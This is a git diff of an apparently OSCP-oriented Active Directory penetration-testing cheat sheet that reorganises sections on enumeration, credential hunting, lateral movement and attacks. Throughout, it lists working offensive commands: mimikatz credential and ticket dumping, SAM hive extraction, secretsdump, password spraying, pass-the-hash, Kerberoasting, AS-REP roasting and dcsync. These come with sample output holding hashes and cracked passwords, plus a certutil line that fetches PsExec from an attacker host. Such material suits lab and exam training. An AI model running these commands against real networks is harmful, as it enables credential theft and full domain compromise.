@@ -2493,271 +2493,38 @@ The command completed successfully.
 https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md#AD-Lateral-Movement-1
 ````
 ### Active Directory Enumeration <img src="https://cdn-icons-png.flaticon.com/512/9616/9616012.png" width="40" height="40" />
-#### External Network
-##### nmap goodes
+#### Enumeration
+##### Initial Network scans
 ````
 nmap -p80 --min-rate 1000 10.11.1.20-24 #looking for initial foothold
 nmap -p88 --min-rate 1000 10.11.1.20-24 #looking for DC
 ````
-#### Foothold Enumeration Legacy
+##### Network commands
 ````
-net user #users on current computer
+arp -a #look for IPs that your victim is connected
+ipconfig #look for a dual victim machine, typically two $IPs shown
 ````
+##### User Hunting
 ````
-net user /domain #users in the current domain
+net users #Local users
+net users /domain #All users on Domain
+net users jeff /domain #Queury for more infromation on each user
+net group /domain #Enumerate all groups on the domain
+net group "Music Department" / domain #Enumerating specific domain group for members
 ````
-````
-net user <user>_admin /domain #Look for specific users on the domain
-````
-````
-net group /domain #global groups in domains
-````
-```
-net group "Domain Computers" /domain #All workstations and servers joined to the domain
-````
-````
-net group "domain controllers" /domain #This is the domain controller you want to reach
-````
-````
-tree /f C:\Users\ #look for interesting files, backups etc.
-````
-````
-dir /s *.bak #looking for bak files
-````
-````
-arp -a #map out network and connection
-````
-````
-ipconfig #ethernet adapter
-````
-
-![image](https://user-images.githubusercontent.com/127046919/236584915-a817ff3b-c6fa-4e4b-a83c-b550c4f2011e.png)
-
-#### Foothold Enumeration Powerview
-````
-Import-Module .\PowerView.ps1
-````
-````
-Get-NetDomain
-Get-NetUser
-````
-
-**
-
-### Active Directory Credential Hunting <img src="https://cdn-icons-png.flaticon.com/512/1176/1176601.png" width="40" height="40" />
-#### cached storage credential attacks <img src="https://cdn-icons-png.flaticon.com/128/1486/1486513.png" width="40" height="40" />
-Since Microsoft's implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request. In current versions of Windows, these hashes are stored in the Local Security Authority Subsystem Service (LSASS)1 memory space. If we gain access to these hashes, we could crack them to obtain the cleartext password or reuse them to perform various actions.
-
-##### MimiKatz <img src="https://cdn-icons-png.flaticon.com/128/1864/1864514.png" width="40" height="40" /> 
-````
-https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
-````
-````
-https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49
-````
-````
-unzip mimikatz_trunk.zip 
-````
-````
-cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe .
-````
-````
-cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
-````
-````
-privilege::debug
-````
-````
-sekurlsa::logonpasswords
-````
-Notice that we have two types of hashes highlighted in the output above. This will vary based on the functional level of the AD implementation. For AD instances at a functional level of Windows 2003, NTLM is the only available hashing algorithm. For instances running Windows Server 2008 or later, both NTLM and SHA-1 (a common companion for AES encryption) may be available. On older operating systems like Windows 7, or operating systems that have it manually set, WDigest,9 will be enabled. When WDigest is enabled, running Mimikatz will reveal cleartext password alongside the password hashes.
-
-SEKURLSA::Tickets – Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account.
-Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).
-
-Dumps all authenticated Kerberos tickets on a system.
-Requires administrator access (with debug) or Local SYSTEM rights
-````
-sekurlsa::tickets
-````
-A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets. As already discussed, we know that Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS and we can use Mimikatz to interact with and retrieve our own tickets and the tickets of other local users.
-
-The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. On the other side, armed with a TGT ticket, we could request a TGS for specific resources we want to target within the domain. We will discuss how to leverage stolen or forged tickets later on in the module.
-#### Dumping and Cracking mscash - Cached Domain Credentials
-````
-https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials
-````
-````
-mimikatz #  lsadump::cache
-````
-##### Results
-````
-mimikatz # 
-lsadump::cache
-mimikatz # Domain : FILES02
-SysKey : 9ee80337b5848e02903e9c792b816b42
-
-Local name : FILES02 ( S-1-5-21-617574027-3497765368-2664405491 )
-Domain name : MEDTECH ( S-1-5-21-976142013-3766213998-138799841 )
-Domain FQDN : medtech.com
-
-Policy subsystem is : 1.18
-LSA Key(s) : 1, default {4219656f-f474-f739-bf6e-945c3525288a}
-  [00] {4219656f-f474-f739-bf6e-945c3525288a} d5b9987b6e4d4b3ba158c3994ded25570d656e23a8f028ef87219939a51a6730
-
-* Iteration is set to default (10240)
-
-[NL$1 - 10/18/2022 7:29:00 AM]
-RID       : 000001f4 (500)
-User      : MEDTECH\Administrator
-MsCacheV2 : a7c5480e8c1ef0ffec54e99275e6e0f7
-
-[NL$2 - 9/28/2022 3:52:28 AM]
-RID       : 00000456 (1110)
-User      : MEDTECH\yoshi
-MsCacheV2 : cd21be418f01f5591ac8df1fdeaa54b6
-
-[NL$3 - 11/15/2022 2:43:35 AM]
-RID       : 00000455 (1109)
-User      : MEDTECH\wario
-MsCacheV2 : b82706aff8acf56b6c325a6c2d8c338a
-
-[NL$4 - 11/11/2022 3:09:23 AM]
-RID       : 00000452 (1106)
-User      : MEDTECH\joe
-MsCacheV2 : 464f388c3fe52a0fa0a6c8926d62059c
-````
-##### cracking with hashcat
-````
-$DCC2$10240#username#hash
-````
-````
-$DCC2$10240#Administrator#a7c5480e8c1ef0ffec54e99275e6e0f7
-$DCC2$10240#yoshi#cd21be418f01f5591ac8df1fdeaa54b6
-$DCC2$10240#wario#b82706aff8acf56b6c325a6c2d8c338a
-$DCC2$10240#joe#464f388c3fe52a0fa0a6c8926d62059c
-````
-
-````
-hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt
-````
-
-````
-This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password
-````
-##### Errors
-###### #1
-````
-INFO: All hashes found as potfile and/or empty entries! Use --show to display them.
-````
-````
-hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable
-````
-###### #2
-````
-hashcat -m 2100 '$DCC2$10240#yoshi#cd21be418f01f5591ac8df1fdeaa54b6' /usr/share/wordlists/rockyou.txt --show
-````
-````
-$DCC2$10240#yoshi#cd21be418f01f5591ac8df1fdeaa54b6:Mushroom!
-````
-#### Service Account Attacks <img src="https://cdn-icons-png.flaticon.com/128/720/720234.png" width="40" height="40" />
-Recalling the explanation of the Kerberos protocol, we know that when the user wants to access a resource hosted by a SPN, the client requests a service ticket that is generated by the domain controller. The service ticket is then decrypted and validated by the application server, since it is encrypted through the password hash of the SPN.
-
-When requesting the service ticket from the domain controller, no checks are performed on whether the user has any permissions to access the service hosted by the service principal name. These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller. Then, since it is our own ticket, we can extract it from local memory and save it to disk.
-##### PowerView Enumeration
-````
-wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
-````
-````
-import-module .\PowerView.ps1
-````
-````
-Get-NetUser -SPN #Kerberoastable users
-Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
-Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
-Find-LocalAdminAccess #Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
-````
-##### Rubeus Exploitation
-When we ran Rubeus it triggered a Keberos Auth request and we were able to use mimikatz after to get the ticket as well.
-````
-cp /opt/Ghostpack-CompiledBinaries/Rubeus.exe .
-````
-````
-.\Rubeus.exe kerberoast /simple /outfile:hashes.txt
-type hashes.txt
-````
-##### Cracking Rubeus SPN TGS-REP examples
-##### Enumeration
-````
-Get-NetUser -SPN | select serviceprincipalname
-
-serviceprincipalname           
---------------------           
-kadmin/changepw                
-HTTP/ExchangeService.xor.com   
-HTTP/ExtMail.xor.com           
-MSSQLSvc/xor-app23.xor.com:1433
-````
-##### Exploit
-````
-.\Rubeus.exe kerberoast /simple /outfile:hashes.txt
-````
-##### grab the tickets to your local kali
-````
-cat hashes.txt                                                                                                               
-$krb5tgs$23$*sqlServer$xor.com$MSSQLSvc/xor-app23.xor.com:1433@xor.com*$C9EB7D90EF4CD11DC6B57F207EEEC53D$3C6AAE992D99A862602D56BB15F501433955BBF02C3A4CE0A34EA2DB2C3BD3F1F3438C556BC9333A1EE02960C5B0EDAB2611D8D7522C3851B5F3E662C93DD99E6CC31CD55C5E8AC7DD3158FE9F24DACE1F264952731326A3151484FD973CA619A1EE48785F1DC944C3AE6E089541FA10DD95916EB644EA7BA8B4F82630E514AA59FA2DB76C244B94277683BEA5CEA5B2C32BB992E57CDC22BFE2F1C4B564E1A17B48995E806323AC61E92713B5B73EBFDEF274653FC477EEF7C93F426C15390B977D80160AF23C87732604D844A935A941A307B7A4E8E5EF61D0DC89DEB63FA6FAAC2CA38DFC2A3E587073CA4B3A45EAFC11ECD006B02BFB4DCF27D830EDDB0E92425D6D6BD49101DB39385C9D8701BEBA68D7D4E56F49312AE2B5774C5D4D9FAB64FCAF3B8F51B4902E55727AB53AFDE7F6A2CFEE1D923BFC15D87A52E38998F4F11A82A7DBE449E800F4E3E70F6B55F659E4A88B6A4A5DC4C93946F7C96A4C3859F4232DD5DD8B1E11085C2C5769807782C6748B61E2B048CB6AC51E8FA0447D8A0BD0DC44274207AE72C892D863812650FC84F0D1AF5F49DD3DB591B5D5BADEBE3D221A2DBAAE26DFEA9A12E3ABAC24C57E496F2A570C0DA5C05CA3FF7045D105AF919E8224E29C4214743112AD8FC979DFA402FCFBD302CC101C5903F40577036AAD77838279B5EA5F976A68173AB24A24E65209CFE185E487C9993717B04723EA857AA1ACA1A2787E4A004B1664AD53C3185EF284FF13E3BF98FB2594F293E7781768CAFDF3E21B8110A547F84FBD2C8A4A47D1593F125B458151B67B29CF15468B4B09B15664C5812ABF539676BD7DF2CA6F83670463F2492D08775896A45404EFC35D024F1CBF6C6EC2FC4639749B308B63C41D6F310BC681EB819253EB8A1967F2C2109D2EAE2AC1E87A3D42D47742BC89590EA7D67662BA4E8F1BC7C97FC3F9CC642DF2FE9B3AE4A307088DEC1B60C55088FB2B900C199EBAF7025E14EA538D511CBCF6EC694F8349B7A11513E00AFED4666EB953A82CA25361AD72369D87DAFB6DDA8B20858B20906F408A83032FF509E40125F58A297EAC10C8B022494A1A9D1D9C6A65A971E9D3DAE7A3E530CDBB7EB3D509A77AC3487B4C55635B0926F3E1878303256F1B0EECB3B577DC30DE9678C87E87DD738B2C773265718E81D3D7FBA67D6200908A45670ED8CAF2B05F21BC7B678F7E137867986D4642316DDCDA2A9C657E6BE9417FD98634E3A03D8FEE59B1080A0F2D02613EFB5D0F978920278D00347367913928D47F59ACBFF26D0E524F50C4F5D36519EDE6E4D461AC6CF04CA1717B755FF2D7049480698E4A46C0C9F2BCB62847BF5A4463EE1632F86BD96326E3098387DA373F8DF8539B274659FE37AFF1B3AB624A2F91961E23527959049A4AF882EC4CA5271A04B466D1C56DC5C17EAB47D942510CDC18346E03BF5CDBD8A534BF8333C0A6D777FA16566E4A3D738BF00B16F28AC64A738E631A68E633725448FE35FC53429CF6CC96ED8556F8C20B24E690D7CFB08CEBD6BFF04CEDA70977048E0761847378446FB060E5B5
-````
-##### Crack the tickets in your local kali 
-````
-hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
-#13100	Kerberos 5, etype 23, TGS-REP
-````
-##### MimiKatz <img src="https://cdn-icons-png.flaticon.com/128/1864/1864514.png" width="40" height="40" /> 
-````
-https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
-or
-https://github.com/allandev5959/mimikatz-2.1.1
-````
-````
-unzip mimikatz_trunk.zip 
-````
-````
-cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe .
-````
-````
-cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
-````
-To download the service ticket with Mimikatz, we use the kerberos::list command, which yields the equivalent output of the klist command above. We also specify the /export flag to download to disk as shown in Listing 33.
-````
-kerberos::list /export
+##### Credential hunting
+###### Interesting Files
 `````
-##### kerberoast Exploitation
-````
-sudo apt update && sudo apt install kerberoast
-````
-````
-python /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
-````
-````
-rdesktop -u 'Allison' -p 'RockYou!' 192.168.129.59 -g 94% -d OFFSEC
-````
-##### Powershell
-This lists current cached tickets
-````
-klist
-````
-#### Credential Dumping SAM
-SAM is short for the Security Account Manager which manages all the user accounts and their passwords. It acts as a database. All the passwords are hashed and then stored SAM. It is the responsibility of LSA (Local Security Authority) to verify user login by matching the passwords with the database maintained in SAM. SAM starts running in the background as soon as the Windows boots up. SAM is found in C:\Windows\System32\config and passwords that are hashed and saved in SAM can found in the registry, just open the Registry Editor and navigate yourself to HKEY_LOCAL_MACHINE\SAM.
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction
+`````
+###### Sam, System, Security Files
 ````
 whoami /all #BUILTIN\Administrators
 ````
-##### Cached domain hashes
 ````
 reg save hklm\security c:\security
-````
-##### local admin and users ntlm
-````
-#cmd.exe
 reg save hklm\sam c:\sam
 reg save hklm\system c:\system
 ````
@@ -2765,224 +2532,155 @@ reg save hklm\system c:\system
 /opt/impacket/examples/secretsdump.py -sam sam -security security -system system LOCAL
 ````
 ````
-cat hashes.sam    
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:a8c8b7a37513b7eb9308952b814b522b:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-HelpAssistant:1000:05fa67eaec4d789ec4bd52f48e5a6b28:2733cdb0d8a1fec3f976f3b8ad1deeef:::
-SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:0f7a50dd4b95cec4c1dea566f820f4e7:::
-alice:1004:aad3b435b51404eeaad3b435b51404ee:b74242f37e47371aff835a6ebcac4ffe:::
-hacker:1006:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+https://crackstation.net/
+hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
+````
+###### impacket-secretsdump
+````
+impacket-secretsdump Administrator:'password'@$IP -outputfile hashes
 ````
 ````
-impacket-secretsdump LEGACY/damon:'i6yuT6tym@'@192.168.138.249 -outputfile hashes
-systeminfo #DC01
+https://crackstation.net/
+hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
 ````
-### Active Directory Lateral Movement <img src="https://cdn-icons-png.flaticon.com/512/9760/9760046.png" width="40" height="40" />
-#### Direction
-##### Finding Machines
+###### Powershell
+````
+PS C:\> (Get-PSReadlineOption).HistorySavePath
+C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+type C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+echo "Let's check if this script works running as damon and password i6yuT6tym@"
+````
+###### PowerView
+````
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+````
+````
+Import-Module .\PowerView.ps1
+Get-NetDomain
+Get-NetUser
+Get-DomainUser 
+Get-DomainUser | select cn
+Get-NetGroup | select name
+Get-NetGroupMember -MemberName "domain admins" -Recurse | select MemberName
+````
+````
+Get-NetUser -SPN #Kerberoastable users
+Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
+Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
+Find-LocalAdminAccess #Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
+````
+##### mimikatz.exe
+````
+https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
+or
+https://github.com/allandev5959/mimikatz-2.1.1
+unzip mimikatz_trunk.zip 
+cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe .
+cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
+````
+````
+privilege::debug
+mimikatz token::elevate
+sekurlsa::logonpasswords
+sekurlsa::tickets
+````
+#### AD Lateral Movement
+##### Network
 ````
 nslookup #use this tool to internally find the next computer to pivot to.
 xor-app23.xor.com #found this from either the tgt, mimikatz, etc. Shows you where to go next
 Address: 10.11.1.121
 ````
-##### Checking credentials
 ###### SMB
 ````
-crackmapexec smb 10.11.1.120-124 -u Daisy -p XorPasswordIsDead17 -d xor.com -x whoami #change smb to other services
-crackmapexec smb 10.11.1.120-124 -u administrator -H 'LMHASH:NTHASH' --local-auth --lsa #for hashes
-crackmapexec smb 10.11.1.20-24 -u pete -H b566afa0a7e41755a286cba1a7a3012d --exec-method smbexec -X 'whoami'
-````
-
-````
 impacket-psexec joe:Flowers1@172.16.138.11 cmd.exe
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Administrator@192.168.129.59
+impacket-psexec -hashes lm:ntlm zensvc@192.168.183.170
 ````
-###### winrm
-````
-proxychains crackmapexec winrm 172.16.138.10-83 -u users.txt -p Mushroom! -d MEDTECH.COM -x whoami
-````
+###### WINRM
 ````
 evil-winrm -u <user> -p <password> -i 172.16.138.83
 evil-winrm -u <user> -H <hash> -i 172.16.138.83
 ````
-###### wmi
+###### WMI
 ````
 proxychains -q impacket-wmiexec medtech/leon:'rabbit:)'@172.16.138.10
+impacket-wmiexec medtech/leon:'rabbit:)'@172.16.138.10
 ````
-###### RDP 
+###### RDP
 ````
-crackmapexec rdp 192.168.186.191 -u users.txt -p passwords.txt --continue-on-success
+rdesktop -u 'Nathan' -p 'abc123//' 192.168.129.59 -g 94% -d OFFSEC
+xfreerdp /v:10.1.1.89 /u:xavier /pth:5e22b03be22022754bf0975251e1e7ac
+xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:dmzadmin /p:SlimGodhoodMope
+xfreerdp /u:dmzadmin  /v:192.168.238.191 /cert:ignore /p:"SlimGodhoodMope"  /timeout:20000 /drive:home,/tmp
 ````
-#### Pass the Hash <img src="https://cdn-icons-png.flaticon.com/128/6107/6107027.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/6050/6050858.png" width="40" height="40" />
-The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password. Note that this will not work for Kerberos authentication but only for server or service using NTLM authentication.
-##### third party cheat sheet
+###### Accessing shares with RDP
 ````
-https://juggernaut-sec.com/pass-the-hash-attacks/
+windows + R
+type: \\172.16.120.21
+Enter User Name
+Enter Password
+[now view shares via rdp session]
 ````
-#### Commands
+#### AD attacks
+##### Spray and Pray
 ````
-impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Administrator@192.168.129.59
-psexec.py tris@10.11.1.20 -hashes 08df3c73ded940e1f2bcf5eea4b8dbf6:08df3c73ded940e1f2bcf5eea4b8dbf6
+sudo crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+sudo crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
+sudo crackmapexec smb 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-success
+sudo proxychains crackmapexec smb 10.10.124.140 -u Administrator -p hghgib6vHT3bVWf  -x whoami --local-auth
+sudo proxychains crackmapexec winrm 10.10.124.140 -u Administrator -p hghgib6vHT3bVWf  -x whoami --local-auth
+sudo crackmapexec winrm 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+sudo crackmapexec winrm 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
+sudo crackmapexec winrm 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-succes
 ````
-##### Exploitation chain
-###### mimikatz.exe
 ````
-privilege::debug
-sekurlsa::logonpasswords
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
 ````
+##### Pass-the-hash
 ````
-Authentication Id : 0 ; 206403 (00000000:00032643)
-Session           : Interactive from 1
-User Name         : tris
-Domain            : svcorp
-Logon Server      : SV-DC01
-Logon Time        : 3/24/2022 3:59:41 PM
-SID               : S-1-5-21-466546139-763938477-1796994327-1124
-        msv :
-         [00000003] Primary
-         * Username : tris
-         * Domain   : svcorp
-         * NTLM     : 08df3c73ded940e1f2bcf5eea4b8dbf6
-         * SHA1     : b6e8eb6ec416d510bd082d72d687b2f41d6b5dc3
-         * DPAPI    : 2800a2930c81ce49f9cc565282754433
-        tspkg :
-        wdigest :
-         * Username : tris
-         * Domain   : svcorp
-         * Password : (null)
-        kerberos :
-         * Username : tris
-         * Domain   : SVCORP.COM
-         * Password : (null)
-        ssp :
-        credman :
-
-````
-###### cme
-`````
+crackmapexec smb 10.11.1.120-124 -u administrator -H 'LMHASH:NTHASH' --local-auth --lsa #for hashes
+crackmapexec smb 10.11.1.20-24 -u pete -H b566afa0a7e41755a286cba1a7a3012d --exec-method smbexec -X 'whoami'
 crackmapexec smb 10.11.1.20-24 -u tris -H 08df3c73ded940e1f2bcf5eea4b8dbf6 -d svcorp.com -x whoami
-`````
-###### foothold
 ````
-psexec.py tris@10.11.1.20 -hashes 08df3c73ded940e1f2bcf5eea4b8dbf6:08df3c73ded940e1f2bcf5eea4b8dbf6
-````
-#### Overpass the Hash <img src="https://cdn-icons-png.flaticon.com/128/9513/9513588.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/5584/5584500.png" width="40" height="40" /> 
-##### Intro
-With overpass the hash,1 we can "over" abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user.
-##### Pre-req
-````
-In this technique we have to first get system access and follow the adding a user with high privs guides!
-Once the that guide in our cheat sheet is done come back to this. We are going from .24 to .21 in this guide
-````
-##### Exploitation mimikatz
-````
-privilege::debug
-sekurlsa::logonpasswords
-````
-###### Results
-````
-Authentication Id : 0 ; 1822926 (00000000:001bd0ce)
-Session           : NewCredentials from 0
-User Name         : SYSTEM
-Domain            : NT AUTHORITY
-Logon Server      : (null)
-Logon Time        : 11/04/2023 23:45:17
-SID               : S-1-5-18
-        msv :
-         [00000003] Primary
-         * Username : pete
-         * Domain   : svcorp.com
-         * NTLM     : 0f951bc4fdc5dfcd148161420b9c6207
-        tspkg :
-        wdigest :
-         * Username : pete
-         * Domain   : svcorp.com
-         * Password : (null)
-        kerberos :
-         * Username : pete
-         * Domain   : svcorp.com
-         * Password : (null)
-        ssp :
-        credman :
-````
-##### Exploitation
-````
-sekurlsa::pth /user:pete /domain:svcorp.com /ntlm:0f951bc4fdc5dfcd148161420b9c6207 /run:PowerShell.exe
-#this should spawn a new shell
-````
-##### Checking for lateral movement
-````
-crackmapexec smb 10.11.1.20-24 -u pete -H 0f951bc4fdc5dfcd148161420b9c6207 -d svcorp.com -x whoami
-````
-###### Results
-````
-crackmapexec smb 10.11.1.20-24 -u pete -H 0f951bc4fdc5dfcd148161420b9c6207 -d svcorp.com -x whoami
-SMB         10.11.1.21      445    SV-FILE01        [*] Windows Server 2016 Standard 14393 x64 (name:SV-FILE01) (domain:svcorp.com) (signing:False) (SMBv1:True)
-SMB         10.11.1.24      445    SVCLIENT73       [*] Windows 10 Pro N 14393 x64 (name:SVCLIENT73) (domain:svcorp.com) (signing:False) (SMBv1:True)
-SMB         10.11.1.22      445    SVCLIENT08       [*] Windows 10 Pro N 14393 x64 (name:SVCLIENT08) (domain:svcorp.com) (signing:False) (SMBv1:True)
-SMB         10.11.1.20      445    SV-DC01          [*] Windows 10.0 Build 17763 x64 (name:SV-DC01) (domain:svcorp.com) (signing:True) (SMBv1:False)
-SMB         10.11.1.21      445    SV-FILE01        [+] svcorp.com\pete:0f951bc4fdc5dfcd148161420b9c6207 (Pwn3d!)
-SMB         10.11.1.24      445    SVCLIENT73       [+] svcorp.com\pete:0f951bc4fdc5dfcd148161420b9c6207 
-SMB         10.11.1.22      445    SVCLIENT08       [+] svcorp.com\pete:0f951bc4fdc5dfcd148161420b9c6207 
-SMB         10.11.1.21      445    SV-FILE01        [+] Executed command 
-SMB         10.11.1.21      445    SV-FILE01        svcorp\pete
-SMB         10.11.1.20      445    SV-DC01          [+] svcorp.com\pete:0f951bc4fdc5dfcd148161420b9c6207
-````
-##### Moving to next target
+##### TGT Impersonation
 ````
 PS> klist # should show no TGT/TGS
-PS> net use \\SV-FILE01 (try other comps/targets) # generate TGT by authN to network share on the computer
+PS> net use \\SV-FILE01 (try other comps/targets) # generate TGT by auth to network share on the computer
 PS> klist # now should show TGT/TGS
 PS> certutil -urlcache -split -f http://192.168.119.140:80/PsExec.exe #/usr/share/windows-resources
 PS>  .\PsExec.exe \\SV-FILE01 cmd.exe
 ````
-###### Results
+##### AS-REP Roasting
 ````
-PsExec v2.2 - Execute processes remotely
-Copyright (C) 2001-2016 Mark Russinovich
-Sysinternals - www.sysinternals.com
-
-
-Microsoft Windows [Version 10.0.14393]
-(c) 2016 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>ipconfig
-
-Windows IP Configuration
-
-
-Ethernet adapter Ethernet0:
-
-   Connection-specific DNS Suffix  . :
-   IPv4 Address. . . . . . . . . . . : 10.11.1.21
-   Subnet Mask . . . . . . . . . . . : 255.255.0.0
-   Default Gateway . . . . . . . . . : 10.11.0.1
-
-Tunnel adapter isatap.{EA29B022-A71B-48E3-9746-0A3B38A4777C}:
-
-   Media State . . . . . . . . . . . : Media disconnected
-   Connection-specific DNS Suffix  . :
-
-C:\Windows\system32>whoami
-svcorp\pete
-
-C:\Windows\system32>
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
 ````
-
-#### Pass the Ticket <img src="https://cdn-icons-png.flaticon.com/128/6009/6009553.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/3851/3851423.png" width="40" height="40" />
-We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility. The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.
-#### Silver Ticket <img src="https://cdn-icons-png.flaticon.com/512/3702/3702979.png" width="40" height="40" />
-However, with the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource with any permissions we desire. This custom-created ticket is known as a silver ticket1 and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all. Mimikatz can craft a silver ticket and inject it straight into memory through the (somewhat misleading) kerberos::golden2 command. We will explain this apparent misnaming later in the module.
-#### Distributed Component Object Model (DCOM) <img src="https://cdn-icons-png.flaticon.com/128/1913/1913653.png" width="40" height="40" />
-The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network. DCOM objects related to Microsoft Office allow lateral movement, both through the use of Outlook7 as well as PowerPoint.8 Since this requires the presence of Microsoft Office on the target computer, this lateral movement technique is best leveraged against workstations.
-#### Golden Ticket <img src="https://cdn-icons-png.flaticon.com/128/7505/7505544.png" width="40" height="40" /> 
-Going back to the explanation of Kerberos authentication, we recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called krbtgt.1
-
-If we are able to get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, or golden tickets. t this stage of the engagement, we should have access to an account that is a member of the Domain Admins group or we have compromised the domain controller itself. With this kind of access, we can extract the password hash of the krbtgt account with Mimikatz.
-#### Domain Controller Synchronization <img src="https://cdn-icons-png.flaticon.com/128/9405/9405206.png" width="40" height="40" /> 
+````
+cp /opt/Ghostpack-CompiledBinaries/Rubeus.exe .
+.\Rubeus.exe asreproast /nowrap /outfile:hashes.asreproast
+type hashes.asreproast
+````
+###### Cracking AS-REP Roasting
+````
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+````
+##### Kerberoasting
+````
+sudo impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip 192.168.50.70 corp.com/pete
+````
+````
+.\Rubeus.exe kerberoast /simple /outfile:hashes.kerberoast
+````
+###### Cracking Kerberoasting
+````
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+````
+##### Domain Controller Synchronization
 To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user. We could also steal a copy of the NTDS.dit database file,1 which is a copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.
 ````
 lsadump::dcsync /all /csv #First run this to view all the dumpable hashes to be cracked or pass the hash
-lsadump::dcsync /user:zensvc #Pick a user with admin rights to crack the password or pass the hash
+lsadump::dcsync /user:zensvc #Pick a user with domain admin rights to crack the password or pass the hash
 ````
 ````
 Credentials:
@@ -2992,15 +2690,4 @@ Credentials:
 ````
 ````
